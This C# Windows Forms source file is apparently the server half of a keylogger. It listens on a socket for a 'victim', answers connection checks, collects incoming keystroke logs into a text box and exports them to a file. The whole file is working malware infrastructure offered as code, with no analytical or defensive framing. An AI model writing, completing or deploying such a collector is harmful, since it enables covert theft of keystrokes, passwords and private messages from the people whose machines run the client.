using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.IO;
    
 namespace Server
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
        }

        private Thread listenerThread;

        private void mainForm_Load(object sender, EventArgs e)
        {
            addLog("Initializing the listener.", "ServerLog");
            Listener listener = new Listener();

            ThreadStart threadStart = new ThreadStart(delegate ()
            {
                listener.startListening((Listener.listenerCallback)onMessage, (Listener.delAddLog)addLog);
            });
            listenerThread = new Thread(threadStart);
            listenerThread.IsBackground = true;
            listenerThread.Start();

            addLog("", "ServerLog");
            addLog("Waiting for victim...", "ServerLog");
        }
        
        public delegate void delAddLog(String text, String type);
        public void addLog(String log_text, String type)
        {
            if (networkLogsTxt.InvokeRequired)
            {
                networkLogsTxt.Invoke((delAddLog)addLog, log_text, type);
            }
            else
            {
                switch(type)
                {
                    case "VictimMessage":
                        loggerTxt.Text += log_text;
                        break;
                    case "ServerLog":
                        networkLogsTxt.Text += log_text;
                        networkLogsTxt.Text += "\n";
                        break;
                }
            }
        }

        public void onMessage(String victimMessage, Socket victimSocket)
        {

            if (victimMessage == "check")
            {
                victimSocket.Send(Encoding.ASCII.GetBytes("connected<EOF>"));
                addLog("Victim connection test message.", "ServerLog");
            }
            else
            {
                addLog(victimMessage, "VictimMessage");
            }
        }

        private void clearKeylogsBtn_Click(object sender, EventArgs e)
        {
            loggerTxt.Text = "";
        }

        private void clearLogsBtn_Click(object sender, EventArgs e)
        {
            networkLogsTxt.Text = "";
        }

        private void exportBtn_Click(object sender, EventArgs e)
        {
            Stream myStream;
            SaveFileDialog saveFileDialog1 = new SaveFileDialog();

            saveFileDialog1.Filter = "txt files (*.txt)|*.txt|All files (*.*)|*.*";
            saveFileDialog1.FilterIndex = 2;
            saveFileDialog1.RestoreDirectory = true;

            if (saveFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if ((myStream = saveFileDialog1.OpenFile()) != null)
                {
                    myStream.Write(Encoding.ASCII.GetBytes(loggerTxt.Text), 0, loggerTxt.Text.Length);
                    myStream.Close();
                }
            }
        }

        private void mainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
        }
    }
}
